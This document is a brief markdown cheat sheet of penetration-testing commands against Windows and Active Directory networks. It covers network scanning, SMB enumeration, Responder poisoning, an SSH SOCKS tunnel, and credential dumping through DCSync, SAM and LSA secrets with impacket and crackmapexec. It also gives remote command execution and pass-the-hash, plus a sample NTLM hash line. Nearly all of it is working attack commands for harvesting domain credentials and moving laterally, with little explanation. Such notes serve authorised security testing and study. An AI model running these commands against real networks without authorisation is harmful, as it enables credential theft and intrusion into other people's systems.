# Network Information

## Passive

`arp -a`

`ifconfig / ipconfig`

`tcpdump -i eth0`

`netdiscover`

## Scanning

`nbtscan 192.168.1.1/24`

`nbtscan-unixwiz 192.168.1.1/24`

`nmap -sSV --open -iL ips.txt -oA output`

`sudo nmap --script broadcast-dhcp-discover`

`ping 255.255.255.255`

## Recon

`enum4linux -a ip`

`smbmap -H ip`

`crackmapexec smb IP`

Get IP and hostname

## Responder

### Analyze Mode
`responder -I eth0 -A`

`responder -I eth0 -wFP`

### Force Basic Auth
`responder -I eth0 -wbFP`


# SSH Tunneling

### Socks proxy
`ssh -D 8080 root@IP`

Set Firefox network settings to use socks5 proxy 127.0.0.1 8080, must remove the HTTP proxy

# Dumping

## DCSYNC

`impacket-secretsdump DOMAIN/user:password@IP -history -outputfile output`

Gets all password history too, useful for identifying patterns

`crackmapexec smb IP -u user -p password --ntds`

## Other

`crackmapexec smb IP -u user -p password --sam`

Local SAM passwords, NTLM

`crackmapexec smb IP -u user -p password --lsa`

Looks for LSASS secrets, includes tokens and plaintext passwords stored in memory.

# Bloodhound

# crackmapexec

`crackmapexec smb IP -u user -p password -x 'whoami'`

-X for PowerShell, gets blocked by most systems

`crackmapexec smb IP -u user -H hash -x 'whoami'`

Pass the hash.

# Windows Hashes

## NTLM
Local user hash, can be relayed to hosts with SMB signing disabled.

`Admin:500:aad3c435b514a4eeaad3b935b51304fe:c46b9e588fa0d112de6f59fd6d58eae3:::`

Name:RID (relative identifier):LM hash:NT hash




